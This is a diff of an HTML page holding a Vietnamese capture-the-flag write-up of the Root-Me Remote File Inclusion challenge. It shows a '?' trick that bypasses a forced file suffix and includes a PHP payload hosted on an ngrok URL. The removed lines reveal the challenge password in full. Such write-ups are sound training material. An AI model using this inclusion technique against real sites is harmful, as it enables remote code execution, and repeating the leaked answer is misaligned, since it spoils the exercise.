@@ -170,31 +170,29 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="write-up"><a class="header" href="#write-up">WRITE UP</a></h1>
-<p><strong>Challenge:</strong> <a href="https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion">Remote File Inclusion</a></p>
-<p>Website có thiết lập parameter ?lang để đọc source từ lang.php:</p>
-<img src="./media/image1.png" style="width:6.5in;height:1.40556in" alt="Graphical user interface, text Description automatically generated" />
-<p>Fuzz vào URL thì ta biết được, server sẽ tự động concat thêm ‘_lang.php’ vào cuối keyword ta gán vào ?lang:</p>
-<img src="./media/image2.png" style="width:6.5in;height:1.08681in" alt="Graphical user interface, text, application Description automatically generated" />
-<p>Challenge này thử thách về RFI, ta thử chèn một website bất kỳ vào ?lang:</p>
-<img src="./media/image3.png" style="width:6.5in;height:1.2in" alt="Graphical user interface, text Description automatically generated" />
-<p>Như ban nãy, server tự concat thêm ‘_lang.php’, ta sử dụng <strong>‘?’</strong> để bypass phần concat với payload: http://challenge01.root-me.org/web-serveur/ch13/?lang=https://github.com/nh4ttruong?</p>
-<img src="./media/image4.png" style="width:6.5in;height:3.12083in" alt="A screenshot of a computer Description automatically generated" />
-<p>Bypass thành công, giờ thì ta sử dụng server để RFI qua challenge này. Set-up một file tên là ntruong.txt với content là payload PHP:</p>
-<img src="./media/image5.png" style="width:6.5in;height:0.67917in" />
+                        <h1 id="remote-file-inclusion"><a class="header" href="#remote-file-inclusion"><a href="https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion">Remote File Inclusion</a></a></h1>
+<p>Website có thiết lập parameter <code>?lang</code> để đọc source từ lang.php:</p>
+<p><img src="./media/image1.png" alt="" /></p>
+<p>Fuzz vào URL thì ta biết được, server sẽ tự động concat thêm <code>_lang.php</code> vào cuối keyword ta gán vào <code>?lang</code>:</p>
+<p><img src="./media/image2.png" alt="" /></p>
+<p>Challenge này thử thách về RFI, ta thử chèn một website bất kỳ vào <code>?lang</code>:</p>
+<p><img src="./media/image3.png" alt="" /></p>
+<p>Như ban nãy, server tự concat thêm <code>_lang.php</code>, ta sử dụng <code>?</code> để bypass phần concat với payload: <code>http://challenge01.root-me.org/web-serveur/ch13/?lang=https://github.com/nh4ttruong?</code></p>
+<p><img src="./media/image4.png" alt="" /></p>
+<p>Bypass thành công, giờ thì ta sử dụng server để RFI qua challenge này. Set-up một file tên là <strong>ntruong.txt</strong> với content là payload PHP:</p>
+<p><img src="./media/image5.png" alt="" /></p>
 <p>Sử dụng ngrok server để public IP Address:</p>
-<img src="./media/image6.png" style="width:6.5in;height:3.32917in" alt="A screenshot of a computer Description automatically generated" />
+<p><img src="./media/image6.png" alt="" /></p>
+<p>URL để RFI: <code>https://f512-14-241-170-199.ap.ngrok.io/ntruong.txt</code></p>
+<p><img src="./media/image7.png" alt="" /></p>
+<p>Giờ thì gắn vào <code>?lang</code> ta được:</p>
+<p><img src="./media/image8.png" alt="" /></p>
+<pre><code class="language-yaml">Password: R3m0t3_iS_r3aL1y_********************
+</code></pre>
+<p><img src="./media/image9.png" alt="" /></p>
 <ul>
-<li>URL để RFI: <a href="https://f512-14-241-170-199.ap.ngrok.io/ntruong.txt">https://f512-14-241-170-199.ap.ngrok.io/ntruong.txt</a></li>
+<li>Flag: "****************************"</li>
 </ul>
-<img src="./media/image7.png" style="width:6.5in;height:0.50694in" />
-<p>Giờ thì gắn vào ?lang ta được:</p>
-<img src="./media/image8.png" style="width:6.5in;height:3.57051in" alt="Graphical user interface, application, Word Description automatically generated" />
-<ul>
-<li>Password: R3m0t3_iS_r3aL1y_3v1l</li>
-</ul>
-<img src="./media/image9.png" style="width:6.5in;height:3.4359in" alt="A screenshot of a computer Description automatically generated" />
-<p>- Flag: ****************************</p>
 
                     </main>
 
